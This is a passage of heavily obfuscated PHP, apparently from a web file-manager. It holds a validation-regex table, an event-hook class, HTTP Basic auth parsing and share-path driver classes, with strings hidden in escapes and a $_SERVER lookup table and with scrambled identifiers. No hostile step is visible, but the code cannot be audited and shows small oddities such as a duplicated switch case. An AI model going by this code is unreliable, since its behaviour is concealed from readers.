"\160\x68\157\156\145" => "\x31\x5b\x33\x2d\x39\135\x5c\x64\x7b\71\175", "\x74\145\154\160\x68\157\156\145" => "\x28\134\x28\134\144\173\63\54\x34\x7d\134\x29\x7c\134\144\173\63\54\64\x7d\x2d\174\134\x73\51\x3f\x5c\x64\x7b\67\54\x31\64\175", "\x75\x72\154" => "\50\x68\x74\x74\x70\174\146\x74\160\x7c\150\x74\164\160\163\51\72\x5c\57\134\57\x5b\x5c\167\134\x2d\x5f\135\x2b\50\134\x2e\x5b\134\167\134\x2d\137\135\53\x29\x2b\50\133\134\x77\134\x2d\134\56\54\x40\x3f\136\x3d\45\x26\72\x5c\57\176\x5c\x2b\x23\x5d\x2a\133\x5c\x77\x5c\x2d\134\x40\77\136\x3d\x25\x26\134\x2f\176\x5c\x2b\x23\135\x29\x3f", "\x75\x72\x6c\x46\165\154\x6c" => "\x5b\141\55\x7a\x41\x2d\x7a\x5d\x2b\x3a\134\x2f\x5c\x2f\x5b\x5e\x5c\x73\x5d\x2a", "\151\160" => "\x28\134\144\173\x31\54\63\175\x5c\56\51\x7b\x33\175\50\x5c\144\173\61\x2c\x33\x7d\x29", "\172\151\160" => "\133\61\55\x39\135\134\144\173\65\x7d\50\77\41\x5c\x64\x29", "\151\x64\103\x61\162\x64" => "\50\x5c\144\x7b\x31\65\x7d\x29\x7c\x28\134\144\x7b\61\x37\x7d\x28\134\x64\174\x58\x7c\170\51\x29", "\x63\157\x6c\x6f\x72" => "\x23\50\133\60\x2d\x39\101\55\106\x61\x2d\x66\135\x7b\63\175\174\x5b\60\55\x39\x41\x2d\106\141\x2d\146\135\x7b\x36\x7d\x29", "\x74\151\155\145" => "\50\133\x30\x2d\x31\135\134\x64\174\x32\x5b\x30\55\x34\x5d\51\72\133\x30\55\65\135\x5c\x64", "\x64\141\x74\145" => "\134\144\173\64\175\x5b\55\134\57\135\x3f\50\x30\x5b\x31\x2d\x39\135\174\x31\133\x30\55\62\135\51\x5b\x2d\134\x2f\135\x3f\x28\x5b\60\x2d\x32\135\x5c\x64\174\63\x5b\x30\55\x31\135\x29", "\x64\141\164\x65\124\151\155\x65" => "\134\144\173\x34\175\x5b\55\x5c\57\135\77\x28\x30\133\x31\55\x39\135\174\x31\133\x30\x2d\x32\135\x29\133\55\x5c\x2f\135\x3f\x28\x5b\x30\x2d\62\x5d\x5c\144\x7c\x33\133\x30\x2d\x31\135\51\134\163\53\x28\133\60\55\61\x5d\134\144\174\x32\133\x30\x2d\x34\135\x29\72\x5b\60\x2d\65\x5d\x5c\144", "\x70\x61\x73\163\x77\157\162\x64" => "\50\x3f\x3d\56\52\134\144\51\x28\77\75\x2e\x2a\133\141\x2d\172\135\x29\x28\x3f\75\56\x2a\133\x41\55\132\x5d\x29\56\x7b\x38\54\x32\60\175", "\153\x65\x79" => "\133\x41\55\132\141\x2d\x7a\x30\55\x39\x5f\134\x2d\134\56\135\x2b", "\x6b\x65\x79\106\x75\x6c\154" => "\x5b\x41\x2d\132\x61\55\x7a\x30\55\71\137\x5c\55\x5c\x2e\x5c\163\54\x5d\53"); if (!$dõ®ŠÜ·ææ) { return $CÙ·¶ŒÓ—; } return $CÙ·¶ŒÓ—[$dõ®ŠÜ·ææ]; } public static function check($Fî»•” ª…, $EÑ©¥Î“œ, $fÁ¸‘öŒò• = null) { $F„…„ì’ßç =& $_SERVER[Å¸ş]; switch ($EÑ©¥Î“œ) { case $F„…„ì’ßç[7]: return in_array($Fî»•” ª…, $fÁ¸‘öŒò•); break; case $F„…„ì’ßç[1885]: return floatval($Fî»•” ª…) > $fÁ¸‘öŒò•; break; case $F„…„ì’ßç[1886]: return floatval($Fî»•” ª…) < $fÁ¸‘öŒò•; break; case $F„…„ì’ßç[325]: return strlen($Fî»•” ª…) >= $fÁ¸‘öŒò•[0] && strlen($Fî»•” ª…) <= $fÁ¸‘öŒò•[1]; break; case $F„…„ì’ßç[325]: if (is_array($fÁ¸‘öŒò•)) { return strlen($Fî»•” ª…) >= $fÁ¸‘öŒò•[0] && strlen($Fî»•” ª…) <= $fÁ¸‘öŒò•[1]; break; } else { return strlen($Fî»•” ª…) == $fÁ¸‘öŒò•; break; } case $F„…„ì’ßç[321]: return floatval($Fî»•” ª…) >= $fÁ¸‘öŒò•[0] && floatval($Fî»•” ª…) <= $fÁ¸‘öŒò•[1]; break; } $bÄ†Ôëö¹ù = self::reg(!1); $EÑ©¥Î“œ = isset($bÄ†Ôëö¹ù[$EÑ©¥Î“œ]) ? $bÄ†Ôëö¹ù[$EÑ©¥Î“œ] : $EÑ©¥Î“œ; if (substr($EÑ©¥Î“œ, 0, 1) != $F„…„ì’ßç[8]) { $EÑ©¥Î“œ = $F„…„ì’ßç[1887] . $EÑ©¥Î“œ . $F„…„ì’ßç[1888]; } return preg_match($EÑ©¥Î“œ, $Fî»•” ª…) === 1; } public static function get($CõÖõÆ¥‘¼, $a‹¸ôÇ‡¨ = null, $dˆ¬•Ú¹¾† = null, $EÎœ£˜ˆŸÂ = null) { goto fâä®¨òÅ²; fâä®¨òÅ²: $d²­º‚šœË =& $_SERVER[Å¸ş]; $C˜×´øïŞä = array(); if (!is_null($dˆ¬•Ú¹¾†)) { $C˜×´øïŞä[$d²­º‚šœË[34]] = $dˆ¬•Ú¹¾†; } goto a³½…¡’œ; Cğ¢–‹‘˜: return $Fî”³ÙÓõ[$CõÖõÆ¥‘¼]; goto cÎ¿©Ş““; a³½…¡’œ: if (!is_null($EÎœ£˜ˆŸÂ)) { $C˜×´øïŞä[$d²­º‚šœË[1010]] = $EÎœ£˜ˆŸÂ; } if (!is_null($a‹¸ôÇ‡¨)) { $C˜×´øïŞä[$d²­º‚šœË[1883]] = $a‹¸ôÇ‡¨; } $Fî”³ÙÓõ = Input::getArray(array($CõÖõÆ¥‘¼ => $C˜×´øïŞä)); goto Cğ¢–‹‘˜; cÎ¿©Ş““: } } goto B«¼¸±„ÛŠ; eƒâ½¢à¤¿: define($_SERVER[Å¸ş][1936], 2); define($_SERVER[Å¸ş][1937], 3); define($_SERVER[Å¸ş][1938], 4); goto f„Ô¼˜ö™; cò­çØÙŠ: function getimagesize_io($a¡ÅÈÂµ¥, &$a´ç¡Èİè = false) { $cğÍÉ­¦å¡ = StreamWrapperIO::read($a¡ÅÈÂµ¥, 0, 1024 * 64); $a¡ÅÈÂµ¥ = $_SERVER[Å¸ş][1750] . base64_encode($cğÍÉ­¦å¡); return getimagesize($a¡ÅÈÂµ¥, $a´ç¡Èİè); } class Hook { private static $events = array(); public static function get($b¡’î«Ÿ¿… = false) { if (!$b¡’î«Ÿ¿…) { return self::$events; } else { return self::$events[$b¡’î«Ÿ¿…]; } } public static function apply($D»×éšÍ§¸, $dµ—…’‚× = array()) { $b³ÜŞÖø‚ = ActionApply($D»×éšÍ§¸, $dµ—…’‚×); if (is_string($D»×éšÍ§¸)) { Hook::trigger($D»×éšÍ§¸); } return $b³ÜŞÖø‚; } public static function bind($aİ’à‰™¼, $FèğƒèÖ¸, $E Ì•Æõ¿ = false) { $aÒæŠêôáë =& $_SERVER[Å¸ş]; if (!isset(self::$events[$aİ’à‰™¼])) { self::$events[$aİ’à‰™¼] = array(); } self::$events[$aİ’à‰™¼][] = array($aÒæŠêôáë[1751] => $FèğƒèÖ¸, $aÒæŠêôáë[1752] => $E Ì•Æõ¿, $aÒæŠêôáë[1753] => 0); } public static function once($a‡´Õ¯‚¨¼, $fîùî²·äÔ) { self::bind($a‡´Õ¯‚¨¼, $fîùî²·äÔ, !0); } public static function unbind($Cø¢êŞ«›, $côÛ…øÉ = false) { if (!$côÛ…øÉ) { self::$events[$Cø¢êŞ«›] = array(); return; } $d‘î‡ÚÊ«ƒ = self::$events[$Cø¢êŞ«›]; self::$events[$Cø¢êŞ«›] = array(); if (!is_array($d‘î‡ÚÊ«ƒ)) { return; } for ($DÎàªí»øÁ = 0; $DÎàªí»øÁ < count($d‘î‡ÚÊ«ƒ); $DÎàªí»øÁ++) { if ($d‘î‡ÚÊ«ƒ[$DÎàªí»øÁ][$_SERVER[Å¸ş][1751]] == $côÛ…øÉ) { continue; } self::$events[$Cø¢êŞ«›][] = $d‘î‡ÚÊ«ƒ[$DÎàªí»øÁ]; } } public static function filter($Aë¥Î„ÔéÖ, $F®èÄ‡¾óÑ) { goto B†®ÖÈêá; B†®ÖÈêá: $Føîù“â¶á =& $_SERVER[Å¸ş]; $c›˜ŒÚò­Û = self::$events; if (!isset($c›˜ŒÚò­Û[$Aë¥Î„ÔéÖ])) { return $F®èÄ‡¾óÑ; } goto C§’ø­†„; C§’ø­†„: $B¸¡à¾ò„Ù = $c›˜ŒÚò­Û[$Aë¥Î„ÔéÖ]; $eš˜‘ í¸ˆ = $F®èÄ‡¾óÑ; if (!is_array($B¸¡à¾ò„Ù) || count($B¸¡à¾ò„Ù) == 0) { return $eš˜‘ í¸ˆ; } goto EÂÀÌëŸ¨ö; EÂÀÌëŸ¨ö: for ($b¨°Şƒ¬•˜ = 0; $b¨°Şƒ¬•˜ < count($B¸¡à¾ò„Ù); $b¨°Şƒ¬•˜++) { $a­¸‚·¹õÓ = $B¸¡à¾ò„Ù[$b¨°Şƒ¬•˜]; if ($a­¸‚·¹õÓ[$Føîù“â¶á[1752]] && $a­¸‚·¹õÓ[$Føîù“â¶á[1753]] > 1) { continue; } self::$events[$Aë¥Î„ÔéÖ][$b¨°Şƒ¬•˜][$Føîù“â¶á[1753]] = $a­¸‚·¹õÓ[$Føîù“â¶á[1753]] + 1; $a†×àËÑìö = self::apply($a­¸‚·¹õÓ[$Føîù“â¶á[1751]], array($eš˜‘ í¸ˆ)); if (gettype($a†×àËÑìö) == gettype($eš˜‘ í¸ˆ)) { $eš˜‘ í¸ˆ = $a†×àËÑìö; } } return $eš˜‘ í¸ˆ; goto f‚‘Î–¶‰Š; f‚‘Î–¶‰Š: } public static function trigger($c±°«óßôå) { goto A÷Ö­‘á‚; FàÆ¡å ‘†: return $a»µ‹Ÿ‹ñ¾; goto e§ÓÄÍ†°…; A÷Ö­‘á‚: $eÎ–ëŠ—„ñ =& $_SERVER[Å¸ş]; $Dß…ã³Û†‘ = self::$events; $a»µ‹Ÿ‹ñ¾ = !1; goto CÅŞö‚—; cÊ£×è¤›È: $dß’Ç¾·È÷ = func_get_args(); array_shift($dß’Ç¾·È÷); for ($F‘¯áÂôäì = 0; $F‘¯áÂôäì < count($bĞ‘‚æà‰Ä); $F‘¯áÂôäì++) { $eÍÌÑÇÒ = $bĞ‘‚æà‰Ä[$F‘¯áÂôäì]; if ($eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1752]] && $eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1753]] > 1) { continue; } if (defined($eÎ–ëŠ—„ñ[1754]) && GLOBAL_LOG_HOOK) { write_log($c±°«óßôå . $eÎ–ëŠ—„ñ[1755] . $eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1751]], $eÎ–ëŠ—„ñ[1756]); } self::$events[$c±°«óßôå][$F‘¯áÂôäì][$eÎ–ëŠ—„ñ[1753]] = $eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1753]] + 1; $dîÚÔŠíš– = self::apply($eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1751]], $dß’Ç¾·È÷); if (defined($eÎ–ëŠ—„ñ[1754]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $eÎ–ëŠ—„ñ[1756]); if ($eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1753]] == 200) { $Bßã¦èåù­ = is_array($eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1751]]) ? json_encode_force($eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1751]]) : $eÍÌÑÇÒ[$eÎ–ëŠ—„ñ[1751]]; write_log($eÎ–ëŠ—„ñ[1757] . $c±°«óßôå . $eÎ–ëŠ—„ñ[1758] . $Bßã¦èåù­, $eÎ–ëŠ—„ñ[1759]); } } $a»µ‹Ÿ‹ñ¾ = is_null($dîÚÔŠíš–) ? $a»µ‹Ÿ‹ñ¾ : $dîÚÔŠíš–; } goto FàÆ¡å ‘†; CÅŞö‚—: if (!isset($Dß…ã³Û†‘[$c±°«óßôå])) { return $a»µ‹Ÿ‹ñ¾; } $bĞ‘‚æà‰Ä = $Dß…ã³Û†‘[$c±°«óßôå]; if (!is_array($bĞ‘‚æà‰Ä) || count($bĞ‘‚æà‰Ä) == 0) { return $a»µ‹Ÿ‹ñ¾; } goto cÊ£×è¤›È; e§ÓÄÍ†°…: } } class HttpAuth { public static function get() { $EĞÈ¿³îÙò =& $_SERVER[Å¸ş]; $e×å‚„‰ù¼ = $EĞÈ¿³îÙò[33]; $eè‘åìˆù° = $EĞÈ¿³îÙò[33]; if (isset($_SERVER[$EĞÈ¿³îÙò[1760]])) { $e×å‚„‰ù¼ = $_SERVER[$EĞÈ¿³îÙò[1760]]; $eè‘åìˆù° = $_SERVER[$EĞÈ¿³îÙò[1761]]; } elseif (isset($_SERVER[$EĞÈ¿³îÙò[1762]])) { $FÌÎö¼Ó¸õ = $_SERVER[$EĞÈ¿³îÙò[1762]]; if (strpos(strtolower($FÌÎö¼Ó¸õ), $EĞÈ¿³îÙò[1763]) === 0) { $f±ªÏ´‹Ï = explode($EĞÈ¿³îÙò[4], base64_decode(substr($FÌÎö¼Ó¸õ, 6))); $e×å‚„‰ù¼ = isset($f±ªÏ´‹Ï[0]) ? $f±ªÏ´‹Ï[0] : $EĞÈ¿³îÙò[33]; $eè‘åìˆù° = isset($f±ªÏ´‹Ï[1]) ? $f±ªÏ´‹Ï[1] : 0; } } return array($EĞÈ¿³îÙò[537] => $e×å‚„‰ù¼, $EĞÈ¿³îÙò[894] => $eè‘åìˆù°); } public static function error() { goto c÷æ°÷¨“¯; EÂê“¯½ëÏ: header($cğÏ¥¹ŸÔ[1766]); header($cğÏ¥¹ŸÔ[1767]); header($cğÏ¥¹ŸÔ[1261]); goto d«Õ™ã…äÓ; c÷æ°÷¨“¯: $cğÏ¥¹ŸÔ =& $_SERVER[Å¸ş]; header($cğÏ¥¹ŸÔ[1764]); header($cğÏ¥¹ŸÔ[1765]); goto EÂê“¯½ëÏ; d«Õ™ã…äÓ: die; goto BìÅ÷Ñ¡à…; BìÅ÷Ñ¡à…: } public static function make($aî·×°¢‡, $D•ËÇŠ¦èÜ) { $D­ŸÚ£”ê =& $_SERVER[Å¸ş]; return $D­ŸÚ£”ê[1768] + base64_encode($aî·×°¢‡ . $D­ŸÚ£”ê[4] . $D•ËÇŠ¦èÜ); } } goto fİŞ àì; a•†¯áé§: class PathDriverDbShareItem extends PathDriverDB { public function __construct($CˆÙøì»Õ™) { $this->pathParse = $CˆÙøì»Õ™; $this->model = Model($_SERVER[Å¸ş][1115]); } public function getPathOuter($fº’†ô‡‚ù) { $bÎ„ŞºÔè‡ =& $_SERVER[Å¸ş]; if (!$fº’†ô‡‚ù) { return $fº’†ô‡‚ù; } $FâŸ×ÜÕ‡‡ = $this->parse($fº’†ô‡‚ù); return trim(KodIO::makeShare($this->pathParse[$bÎ„ŞºÔè‡[367]], $FâŸ×ÜÕ‡‡[$bÎ„ŞºÔè‡[367]]), $bÎ„ŞºÔè‡[8]); } protected function infoParse($Dï˜Î‹‡¿Ş, $bÔ±ˆÜ“† = false, $DÆæäÚÊ• = false) { $eˆ…«èÛİ³ =& $_SERVER[Å¸ş]; $eÅ°°°ª¯ª = $this->pathParse[$eˆ…«èÛİ³[367]]; $D‰˜Ö“öŸ’ = trim($this->pathParse[$eˆ…«èÛİ³[1010]], $eˆ…«èÛİ³[8]); return Action($eˆ…«èÛİ³[1122])->sharePathInfo($eÅ°°°ª¯ª, $D‰˜Ö“öŸ’); } public function infoFull($DœçŸáŞ) { $bÒÜŒæÊ£‘ =& $_SERVER[Å¸ş]; $AÚ“ìÄéğÔ = explode($bÒÜŒæÊ£‘[8], trim($DœçŸáŞ, $bÒÜŒæÊ£‘[8])); if (count($AÚ“ìÄéğÔ) > 1) { $fæªÔ‚ï»Õ = implode($bÒÜŒæÊ£‘[8], array_splice($AÚ“ìÄéğÔ, 1)); $EÜÎö“† = $this->model->pathInfoByPath($AÚ“ìÄéğÔ[0], $fæªÔ‚ï»Õ); if (!$EÜÎö“†) { return !1; } $this->pathParse[$bÒÜŒæÊ£‘[1010]] = $EÜÎö“†[$bÒÜŒæÊ£‘[369]]; } return $this->infoParse($DœçŸáŞ); } public function listAll($D¨‰î¨˜×) { goto Eô¬—Ì›†Û; D­÷Í¬×´ë: foreach ($cÍÂÆ©¯ß¿ as &$f¬Éñ™È¶«) { check_abort(); $f¬Éñ™È¶«[$E–‹Ôæàô’[391]] = $f•ÀîÒ±ˆÒ->_shareItemeParse($f¬Éñ™È¶«[$E–‹Ôæàô’[391]], $A¢–·®íè); } unset($f¬Éñ™È¶«); return $cÍÂÆ©¯ß¿; goto eî¬È£¨´À; Bõ¢§òàÑ¶: $cÍÂÆ©¯ß¿ = $this->model->listAll($D¨‰î¨˜×); $A¢–·®íè = Model($E–‹Ôæàô’[538])->getInfo($bë½ä‚•÷¸[$E–‹Ôæàô’[441]]); $f•ÀîÒ±ˆÒ = Action($E–‹Ôæàô’[1122]); goto D­÷Í¬×´ë; Eô¬—Ì›†Û: $E–‹Ôæàô’ =& $_SERVER[Å¸ş]; $bë½ä‚•÷¸ = IO::info($this->pathParse[$E–‹Ôæàô’[75]]); if (!$bë½ä‚•÷¸) { return array(); } goto Bõ¢§òàÑ¶; eî¬È£¨´À: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($føÏÈùç…) { $this->pathParse = $føÏÈùç…; $this->model = Model($_SERVER[Å¸ş][1115]); } protected function infoParse($Fô„®›÷ºé, $Dª¢Ì¥À½ = false, $cÖºš±‘Ã = false) { $A°ƒ¼¸±¶± =& $_SERVER[Å¸ş]; return Action($A°ƒ¼¸±¶±[1016])->sharePathInfo($this->pathParse[$A°ƒ¼¸±¶±[75]], !0); } public function listPath($fé‹ßáóÒ, $B£Ÿ–ì¸ÒÜ = false) { $bÚ³ÚôÃàà =& $_SERVER[Å¸ş]; $b­®ÓÂ³Æ‡ = parent::listPath($fé‹ßáóÒ, $B£Ÿ–ì¸ÒÜ); foreach ($b­®ÓÂ³Æ‡ as $DÄîö…É»à => $cçÁš‡ô‚) { if (!in_array($DÄîö…É»à, array($bÚ³ÚôÃàà[73], $bÚ³ÚôÃàà[74]))) { continue; } foreach ($cçÁš‡ô‚ as $d°¸¼Ğ°ÖÏ => $eòì¯·±·á) { $b­®ÓÂ³Æ‡[$DÄîö…É»à][$d°¸¼Ğ°ÖÏ] = Action($bÚ³ÚôÃàà[1016])->shareItemInfo($eòì¯·±·á); } } return $b­®ÓÂ³Æ‡; } public function listAll($eÅ–¦‰‹ä) { goto Còó‡—ŒÆò; Còó‡—ŒÆò: $f™ÙÈƒß¹Ó =& $_SERVER[Å¸ş]; $C÷‰ï¢Ñø = IO::info($this->pathParse[$f™ÙÈƒß¹Ó[75]]); if (!$C÷‰ï¢Ñø) { return array(); } goto Cğ²ª†¨Ù; Cğ²ª†¨Ù: $E™‘¡·ï‹Ñ = $this->model->listAll($eÅ–¦‰‹ä); foreach ($E™‘¡·ï‹Ñ as &$DÆÍ£…ŠÎ†) { $DÆÍ£…ŠÎ†[$f™ÙÈƒß¹Ó[391]] = Action($f™ÙÈƒß¹Ó[1016])->shareItemInfo($DÆÍ£…ŠÎ†[$f™ÙÈƒß¹Ó[391]]); } unset($DÆÍ£…ŠÎ†); goto Dôóà†À“¥; Dôóà†À“¥: return $E™‘¡·ï‹Ñ; goto B–¶İÂ¦¿†; B–¶İÂ¦¿†: } } class PathDriverDriverShareItem { public function __construct($a™£³¹·ÜÑ) { $this->pathParse = $a™£³¹·ÜÑ; } public function __call($B¯Ì¼»ªË, $A…¹Û—‚µ) { $fš”ÀõÑ‚‰ =& $_SERVER[Å¸ş]; if (method_exists($this, $B¯Ì¼»ªË)) { return; } $d‰÷²“Ú®± = call_user_func_array(array($fš”ÀõÑ‚‰[1123], $B¯Ì¼»ªË), $A…¹Û—‚µ); $bÑÒÍ‘Â¿› = array($fš”ÀõÑ‚‰[1124], $fš”ÀõÑ‚‰[1125], $fš”ÀõÑ‚‰[1126], $fš”ÀõÑ‚‰[1127], $fš”ÀõÑ‚‰[492], $fš”ÀõÑ‚‰[494], $fš”ÀõÑ‚‰[1128], $fš”ÀõÑ‚‰[103], $fš”ÀõÑ‚‰[1129], $fš”ÀõÑ‚‰[1130]); if (in_array($B¯Ì¼»ªË, $bÑÒÍ‘Â¿›)) { $d‰÷²“Ú®± = $this->getPathOuter($d‰÷²“Ú®±); } return $d‰÷²“Ú®±; } public function copy($FÛô…ÅÛÇ, $Bé›íË•™Á, $f¼°ƒ‚”æ = false) { return $this->copyMove($FÛô…ÅÛÇ, $Bé›íË•™Á, $f¼°ƒ‚”æ, $_SERVER[Å¸ş][492]); } public function move($e§ÛèéÓÃ­, $Bñ¿ç‰¬Åï, $fİŒˆ¼É·ê = false) { return $this->copyMove($e§ÛèéÓÃ­, $Bñ¿ç‰¬Åï, $fİŒˆ¼É·ê, $_SERVER[Å¸ş][494]); } private function copyMove($DöâÍ÷µÓ¸, $B™¾Ó»¾¢à, $b…ŸèÁÒ’Œ, $fºË‘¤ä•) { goto E÷–ß†‰àæ; F‹†Û­Í¬: return $DöòÚé„»½; goto FÚÜä†ë²Ñ; c«ˆÖ‹ß¢Ï: if ($AŒ÷¼ø¶->pathParse[$Aéá¸¤”šÂ[996]]) { $B™¾Ó»¾¢à = $AŒ÷¼ø¶->pathParse[$Aéá¸¤”šÂ[996]]; } else { $B™¾Ó»¾¢à = $a¾ ë‹ë‘; } $DöòÚé„»½ = IO::copyMove($DöâÍ÷µÓ¸, $B™¾Ó»¾¢à, $b…ŸèÁÒ’Œ, $fºË‘¤ä•); $DöòÚé„»½ = $this->getPathOuter($DöòÚé„»½); goto F‹†Û­Í¬; E÷–ß†‰àæ: $Aéá¸¤”šÂ =& $_SERVER[Å¸ş]; $a¾ ë‹ë‘ = $B™¾Ó»¾¢à; $AŒ÷¼ø¶ = IO::driverMake($B™¾Ó»¾¢à); goto c«ˆÖ‹ß¢Ï; FÚÜä†ë²Ñ: } public function pathFather($f…Û¹‡Ó‹ ) { return get_path_father($this->pathParse[$_SERVER[Å¸ş][75]]); } public function iconvSystem($Döô÷ÊÊ¿) { return $Döô÷ÊÊ¿; } protected function infoParse($EÓÁ°™ŠÏé, $E£Š“ù¨œ™ = false) { $bº„Äœ…Ş“ =& $_SERVER[Å¸ş]; $B­²…ØóŞ‡ = $this->pathParse[$bº„Äœ…Ş“[439]][$bº„Äœ…Ş“[1017]] . $this->pathParse[$bº„Äœ…Ş“[1010]]; if ($E£Š“ù¨œ™) { $A‚¡ø¹ã = IO::infoWithChildren($B­²…ØóŞ‡); } else { $A‚¡ø¹ã = IO::info($B­²…ØóŞ‡); } $aàà¢˜Æ‘æ = $this->pathParse[$bº„Äœ…Ş“[439]]; return Action($bº„Äœ…Ş“[1122])->_shareItemeParse($A‚¡ø¹ã, $aàà¢˜Æ‘æ); } public function listAll($cÎŠ½ØåŒ¼) { $bµ¾÷Í³ß =& $_SERVER[Å¸ş]; $E³Õ¶éÒ¯ = IO::listAll($cÎŠ½ØåŒ¼); $eĞŒ£­Õ´ = $this->pathParse[$bµ¾÷Í³ß[439]]; foreach ($E³Õ¶éÒ¯ as &$Aƒ““½”›Å) { check_abort(); $Aƒ““½”›Å = array_merge(IO::info($Aƒ““½”›Å[$bµ¾÷Í³ß[75]]), $Aƒ““½”›Å); $Aƒ““½”›Å[$bµ¾÷Í³ß[391]] = Action($bµ¾÷Í³ß[1122])->_shareItemeParse($Aƒ““½”›Å, $eĞŒ£­Õ´); } unset($Aƒ““½”›Å); return $E³Õ¶éÒ¯; } public function getPathOuter($fÛ—ºå†£¡) { goto AÄîÍ—³”¸; AÂÜøùğ™İ: if (substr($EÀ§å‘¹›, 0, strlen($Dàá£·Œ¬Ç)) != $Dàá£·Œ¬Ç) { return !1; } return $this->pathParse[$CÙ„“«çÈñ[1011]] . $CÙ„“«çÈñ[8] . ltrim($AÄñàóÂ¬ò, $CÙ„“«çÈñ[8]); goto BÖö‹Ò¾Í; AÄîÍ—³”¸: $CÙ„“«çÈñ =& $_SERVER[Å¸ş]; $d¥•­åÍƒÅ = KodIO::parse($fÛ—ºå†£¡); if ($d¥•­åÍƒÅ[$CÙ„“«çÈñ[29]] == KodIO::KOD_SHARE_ITEM) { return $d¥•­åÍƒÅ[$CÙ„“«çÈñ[75]]; } goto cÑ£´ä‘Ó; cÑ£´ä‘Ó: $EÀ§å‘¹› = KodIO::clear($fÛ—ºå†£¡); $Dàá£·Œ¬Ç = KodIO::clear($this->pathParse[$CÙ„“«çÈñ[439]][$CÙ„“«çÈñ[1017]]); $AÄñàóÂ¬ò = substr($EÀ§å‘¹›, strlen($Dàá£·Œ¬Ç)); goto AÂÜøùğ™İ; BÖö‹Ò¾Í: } public function getType() { $aˆ½ÇåĞÚ  =& $_SERVER[Å¸ş]; $BŠ²ÇŒÚ×Í = str_replace($aˆ½ÇåĞÚ [71], $aˆ½ÇåĞÚ [33], get_class($this)); return strtolower($BŠ²ÇŒÚ×Í); } public function isTypeObject($FÒÖœ¿å¦) { return IO::isTypeObject($FÒÖœ¿å¦); } public function info($aÛ†’›Å¥) { return $this->infoParse($aÛ†’›Å¥); } public function infoAuth($f Šáßóãê) { return $this->infoParse($f Šáßóãê); } public function infoWithChildren($DÄ…ŒàŞ‚â) { return $this->infoParse($DÄ…ŒàŞ‚â, !0); } public function infoFull($a´àŠö½Ï‡) { return $this->infoParse($a´àŠö½Ï‡); } } goto eŒË”ïµ«›; cŸ™Ï»†¡Š: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $D°™ñ‰‰ğ =& $_SERVER[Å¸ş]; $this->objectDriver = array($D°™ñ‰‰ğ[57], $D°™ñ‰‰ğ[58], $D°™ñ‰‰ğ[59], $D°™ñ‰‰ğ[60], $D°™ñ‰‰ğ[61], $D°™ñ‰‰ğ[62], $D°™ñ‰‰ğ[63], $D°™ñ‰‰ğ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($CËº£»ª) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($CËº£»ª, $_SERVER[Å¸ş][8]); } return $CËº£»ª; } public function getPathName($f’„î£Š“) { return $f’„î£Š“; } public function iconvApp($aèÖ¤“…) { return $aèÖ¤“…; } public function iconvSystem($a¥‘ë¾•Ş) { return $a¥‘ë¾•Ş; } public function iconvTo($Cš•õ£”¸Û, $C‡ÊÙŒìâÆ, $A‹²–ªÌœ‰) { goto A¼³Ùë„Šô; A¼³Ùë„Šô: $CÖàá¡×Ö =& $_SERVER[Å¸ş]; if (!$Cš•õ£”¸Û || !function_exists($CÖàá¡×Ö[65])) { return $Cš•õ£”¸Û; } static $fñ¶ò™ïŞî = array(); goto a„ìÔçÏÁ; CëéÌ©š©: $fñ¶ò™ïŞî[$A‹²–ªÌœ‰ . $CÖàá¡×Ö[66] . $C‡ÊÙŒìâÆ . $CÖàá¡×Ö[67] . $Cš•õ£”¸Û] = $Cš•õ£”¸Û; $fñ¶ò™ïŞî[$A‹²–ªÌœ‰ . $CÖàá¡×Ö[66] . $C‡ÊÙŒìâÆ . $CÖàá¡×Ö[67] . $b¬ÒÀ¤ªØ] = $Cš•õ£”¸Û; $fñ¶ò™ïŞî[$C‡ÊÙŒìâÆ . $CÖàá¡×Ö[66] . $A‹²–ªÌœ‰ . $CÖàá¡×Ö[67] . $b¬ÒÀ¤ªØ] = $b¬ÒÀ¤ªØ; goto DïÍóŒ¡ª ; DïÍóŒ¡ª : return $b¬ÒÀ¤ªØ; goto BÔæöôÚ‡½; C·éñºÚÎà: $b¬ÒÀ¤ªØ = $b¬ÒÀ¤ªØ ? $b¬ÒÀ¤ªØ : $Cš•õ£”¸Û; if (strstr($b¬ÒÀ¤ªØ, $CÖàá¡×Ö[69])) { $b¬ÒÀ¤ªØ = str_replace($CÖàá¡×Ö[69], $CÖàá¡×Ö[70], $b¬ÒÀ¤ªØ); } $fñ¶ò™ïŞî[$C‡ÊÙŒìâÆ . $CÖàá¡×Ö[66] . $A‹²–ªÌœ‰ . $CÖàá¡×Ö[67] . $Cš•õ£”¸Û] = $b¬ÒÀ¤ªØ; goto CëéÌ©š©; a„ìÔçÏÁ: $bÓÔÏ—Àá = $C‡ÊÙŒìâÆ . $CÖàá¡×Ö[66] . $A‹²–ªÌœ‰ . $CÖàá¡×Ö[67] . $Cš•õ£”¸Û; if (isset($fñ¶ò™ïŞî[$bÓÔÏ—Àá])) { return $fñ¶ò™ïŞî[$bÓÔÏ—Àá]; } if (function_exists($CÖàá¡×Ö[68])) { $b¬ÒÀ¤ªØ = @mb_convert_encoding($Cš•õ£”¸Û, $A‹²–ªÌœ‰, $C‡ÊÙŒìâÆ); } else { $b¬ÒÀ¤ªØ = @iconv($C‡ÊÙŒìâÆ, $A‹²–ªÌœ‰, $Cš•õ£”¸Û); } goto C·éñºÚÎà; BÔæöôÚ‡½: } public function getPathInner($aÛ†‹Èí”´) { $F˜»ÅÌÑã = IO::init($aÛ†‹Èí”´); return $F˜»ÅÌÑã->path; } public function getPathOuter($bÍãÑÉ‘Ã) { $DäõÏïÁÆ =& $_SERVER[Å¸ş]; $aªÌ øÎ¦ = strlen(trim($this->pathBase, $DäõÏïÁÆ[8])); $bÍãÑÉ‘Ã = substr(trim($bÍãÑÉ‘Ã, $DäõÏïÁÆ[8]), $aªÌ øÎ¦); return $this->pathDriver . $DäõÏïÁÆ[8] . 